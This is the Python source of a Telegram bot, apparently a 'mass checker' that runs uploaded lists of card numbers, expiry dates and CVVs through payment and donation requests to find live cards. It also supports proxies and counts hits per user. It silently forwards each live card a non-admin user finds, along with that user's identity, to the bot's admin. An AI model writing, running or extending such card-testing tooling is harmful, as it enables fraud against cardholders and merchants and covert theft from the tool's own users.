import os
import time
import threading
import asyncio
import requests
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from config import *
from utils import *
from payment_handler import *

# Global variables
current_processing = {}

async def send_tele(chat_id, message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    params = {'chat_id': chat_id, 'text': message}
    
    try:
        response = requests.get(url, params=params, timeout=10)
        return response.status_code == 200
    except:
        return False

async def send_hit_to_admin(card, user_info, response_text):
    hit_message = f"🎯 **HIT FOUND BY USER** 🎯\n\n"
    hit_message += f"💳 Card: `{card}`\n"
    hit_message += f"📡 Response: {response_text}\n\n"
    hit_message += f"👤 User Info:\n"
    hit_message += f"ID: `{user_info['id']}`\n"
    hit_message += f"Username: @{user_info.get('username', 'Unknown')}\n"
    hit_message += f"Joined: {user_info.get('joined', 'Unknown')}\n\n"
    hit_message += f"🕒 Time: {time.strftime('%Y-%m-%d %H:%M:%S')}"
    
    await send_tele(ADMIN_ID, hit_message)

async def send_progress(chat_id, session, current_card, response_text, user_info=None):
    progress = (session['processed'] / session['total']) * 100 if session['total'] > 0 else 0
    progress = round(progress, 2)
    
    message = f"🔍 CHECKING : {current_card}\n"
    message += f"📡 RESPONSE : {response_text}\n"
    message += f"📊 PROGRESS : {progress}% ({session['processed']}/{session['total']})\n\n"
    message += f"✔ HIT : {session['hit']}\n"
    message += f"✔ LIVE : {session['live']}\n"
    message += f"✔ INSUFFICIENT : {session['insufficient']}\n\n"
    message += "BOT BY : @DoubleT2245"
    
    await send_tele(chat_id, message)
    
    # Auto send hit to admin if it's a live card and found by user
    if user_info and not is_admin(chat_id) and ("LIVE" in response_text or "Approved" in response_text):
        await send_hit_to_admin(current_card, user_info, response_text)
        
        # Update user hit count
        users = load_users()
        user_id_str = str(chat_id)
        if user_id_str in users:
            users[user_id_str]['hits_found'] = users[user_id_str].get('hits_found', 0) + 1
            save_users(users)

def process_card_file(chat_id, file_path):
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            lines = f.readlines()
        
        session = load_session()
        session['total'] = len(lines)
        session['processed'] = 0
        session['live'] = 0
        session['insufficient'] = 0
        session['hit'] = 0
        session['current_file'] = file_path
        save_session(session)
        
        # Get user info for hit reporting
        users = load_users()
        user_info = users.get(str(chat_id), {'id': str(chat_id), 'username': 'Unknown', 'joined': 'Unknown'})
        
        # Send start message
        asyncio.run(send_tele(chat_id, f"🚀 Starting check on {session['total']} cards..."))
        
        for line in lines:
            if chat_id in current_processing and not current_processing[chat_id]:
                break
                
            card = line.strip()
            if not card:
                continue
                
            parts = card.split('|')
            if len(parts) < 4:
                continue
                
            cc_no, month, year, cvv = [part.strip() for part in parts[:4]]
            
            # Process payment
            payment_result = payment(card, cc_no, month, year, cvv)
            
            if payment_result[0]:
                random_info = random_user_info()
                if random_info[0]:
                    donate_result = donate(card, payment_result[1], random_info[1], random_info[2])
                    
                    if donate_result[0]:
                        if donate_result[1] == "live":
                            session['live'] += 1
                            session['hit'] += 1
                            response_text = f"LIVE - {donate_result[2]}"
                        elif donate_result[1] == "insufficient":
                            session['insufficient'] += 1
                            response_text = "Insufficient Funds"
                    else:
                        response_text = f"Declined - {donate_result[1]}"
                else:
                    response_text = "Random Gen Failed"
            else:
                response_text = payment_result[1]
            
            session['processed'] += 1
            save_session(session)
            
            # Send progress update
            asyncio.run(send_progress(chat_id, session, card, response_text, user_info))
            
            time.sleep(5)
        
        # Final report
        final_message = f"✅ CHECK COMPLETED!\nProcessed: {session['processed']} cards\nLIVE: {session['live']}\nINSUFFICIENT: {session['insufficient']}\nHIT: {session['hit']}"
        asyncio.run(send_tele(chat_id, final_message))
        
        # Clean up
        if chat_id in current_processing:
            del current_processing[chat_id]
            
    except Exception as e:
        asyncio.run(send_tele(chat_id, f"❌ Error processing file: {str(e)}"))

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username or ""
    
    if is_banned(user_id):
        await update.message.reply_text("❌ You are banned from using this bot")
        return
    
    add_user(user_id, username)
    
    welcome_text = "🔄 AIO Hub PSM Mass Checker\n\nSend me a .txt file with cards to start checking!\n\nCommands:\n/status - Check progress\n/help - Show help"
    await update.message.reply_text(welcome_text)

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = "🤖 AIO Hub PSM Mass Checker Help\n\nJust send a .txt file with cards in format:\nCC|MM|YYYY|CVV\n\nExample:\n4111111111111111|12|2025|123\n\nBot will automatically start checking and show real-time results!"
    await update.message.reply_text(help_text)

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    session = load_session()
    progress = (session['processed'] / session['total']) * 100 if session['total'] > 0 else 0
    progress = round(progress, 2)
    
    status_text = f"📊 CURRENT STATUS\nProgress: {progress}% ({session['processed']}/{session['total']})\nLIVE: {session['live']}\nINSUFFICIENT: {session['insufficient']}\nHIT: {session['hit']}"
    await update.message.reply_text(status_text)

async def addproxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ Admin only command")
        return
    
    if not context.args:
        await update.message.reply_text("Usage: /addproxy host|port|user|pass")
        return
    
    proxy_data = context.args[0].split('|')
    if len(proxy_data) < 2:
        await update.message.reply_text("Usage: /addproxy host|port|user|pass")
        return
    
    config = {
        "proxy_host": proxy_data[0],
        "proxy_port": proxy_data[1],
        "proxy_username": proxy_data[2] if len(proxy_data) > 2 else "",
        "proxy_password": proxy_data[3] if len(proxy_data) > 3 else ""
    }
    save_config(config)
    
    await update.message.reply_text(f"✅ Proxy configured: {proxy_data[0]}:{proxy_data[1]}")

async def ban_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ Admin only command")
        return
    
    if not context.args:
        await update.message.reply_text("Usage: /ban USER_ID")
        return
    
    target_id = context.args[0]
    banned = load_banned()
    
    if target_id not in banned:
        banned.append(target_id)
        save_banned(banned)
        await update.message.reply_text(f"✅ User {target_id} banned")
    else:
        await update.message.reply_text("⚠️ User already banned")

async def unban_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ Admin only command")
        return
    
    if not context.args:
        await update.message.reply_text("Usage: /unban USER_ID")
        return
    
    target_id = context.args[0]
    banned = load_banned()
    
    if target_id in banned:
        banned.remove(target_id)
        save_banned(banned)
        await update.message.reply_text(f"✅ User {target_id} unbanned")
    else:
        await update.message.reply_text("⚠️ User not found in ban list")

async def users_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ Admin only command")
        return
    
    users = load_users()
    user_count = len(users)
    
    message = f"📊 User Statistics:\nTotal Users: {user_count}\n\n"
    for user_data in list(users.values())[:10]:
        message += f"👤 ID: {user_data['id']}\n"
        message += f"Username: @{user_data.get('username', 'N/A')}\n"
        message += f"Hits Found: {user_data.get('hits_found', 0)}\n"
        message += f"Joined: {user_data.get('joined', 'Unknown')}\n\n"
    
    await update.message.reply_text(message)

async def hits_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ Admin only command")
        return
    
    users = load_users()
    total_hits = 0
    hit_users = []
    
    for user_data in users.values():
        hits = user_data.get('hits_found', 0)
        if hits > 0:
            total_hits += hits
            hit_users.append(user_data)
    
    hit_message = f"🎯 Hit Statistics:\nTotal Hits: {total_hits}\n\n"
    hit_users.sort(key=lambda x: x.get('hits_found', 0), reverse=True)
    
    for user_data in hit_users[:10]:
        hit_message += f"👤 @{user_data.get('username', 'Unknown')}\n"
        hit_message += f"Hits: {user_data.get('hits_found', 0)}\n\n"
    
    await update.message.reply_text(hit_message)

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username or ""
    
    if is_banned(user_id):
        await update.message.reply_text("❌ You are banned from using this bot")
        return
    
    add_user(user_id, username)
    
    document = update.message.document
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Please send only .txt files")
        return
    
    # Check if already processing
    if user_id in current_processing and current_processing[user_id]:
        await update.message.reply_text("⚠️ Already processing a file. Please wait...")
        return
    
    current_processing[user_id] = True
    
    try:
        file = await document.get_file()
        file_path = os.path.join(UPLOAD_DIR, f"{user_id}_{document.file_name}")
        await file.download_to_drive(file_path)
        
        await update.message.reply_text(f"📁 File received: {document.file_name}\nStarting processing...")
        
        # Start processing in separate thread
        thread = threading.Thread(target=process_card_file, args=(user_id, file_path))
        thread.daemon = True
        thread.start()
        
    except Exception as e:
        await update.message.reply_text(f"❌ Error downloading file: {str(e)}")
        current_processing[user_id] = False

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id in current_processing:
        current_processing[user_id] = False
        await update.message.reply_text("🛑 Check stopped by user")
    else:
        await update.message.reply_text("⚠️ No active process to stop")

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    
    # Command handlers
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("status", status_command))
    app.add_handler(CommandHandler("stop", stop_command))
    app.add_handler(CommandHandler("addproxy", addproxy_command))
    app.add_handler(CommandHandler("ban", ban_command))
    app.add_handler(CommandHandler("unban", unban_command))
    app.add_handler(CommandHandler("users", users_command))
    app.add_handler(CommandHandler("hits", hits_command))
    
    # Document handler
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    
    print("🤖 Bot is running...")
    app.run_polling()

if __name__ == '__main__':
    main()
